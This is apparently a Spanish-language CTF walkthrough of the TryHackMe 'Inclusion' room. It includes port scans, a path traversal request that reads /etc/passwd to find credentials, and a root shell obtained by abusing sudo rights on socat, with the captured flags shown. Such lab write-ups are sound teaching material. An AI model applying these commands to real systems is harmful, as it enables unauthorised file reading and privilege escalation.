---
layout: single
title: Inclusion - TryHackMe
excerpt: "Inclusion es una sala creada por 0xmzfr de nivel principiante diseñada para personas que quieren familiarizarse con la vulnerabilidad de inclusión de archivos locales.
En esta máquina conseguiremos la intrusión mediante LFI y escalaremos privilegios usando el binario socat."
date: 2021-10-06
classes: wide
header:
  teaser: /assets/images/thm-Inclusion/lfi.png
  teaser_home_page: true
  icon: /assets/images/thm.png
categories:
  - tryhackme
  - linux
  - fácil
tags:
  - tryhackme
  - file inclusion
  - lfi
  - socat
  - 0xmzfr
---

### Escaneo de puertos
```bash
nmap -p- -T5 --open -v -n -Pn 10.10.155.189

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de servicios
```bash
nmap -sCV -p 22,80 10.10.155.189 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web
Voy a la web y pulso en el botón view details.

![](/assets/images/thm-Inclusion/web.png)

Veo una explicación básica con varios ejemplos de un LFI.

![](/assets/images/thm-Inclusion/web2.png)

### Directory path traversal

Lanzo un `http://10.10.155.189/article?name=../../../etc/passwd` y encuentro unas credenciales.

![](/assets/images/thm-Inclusion/web4.png)

Me conecto mediante SSH a la máquina y como usuario falconfeast puedo leer la flag de user.
```bash
falconfeast@inclusion:~$ cat user.txt 
60989655118397345799
```

### Privesc
Compruebo los comandos que puedo ejecutar con sudo.
```bash
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

### GTFOBins
Uso el recurso GTFOBins para ver que puedo hacer con el binario socat.

![](/assets/images/thm-Inclusion/socat.png)

```bash
falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
```

Una vez como root ya puedo leer la flag.
```bash
cat /root/root.txt
42964104845495153909
```
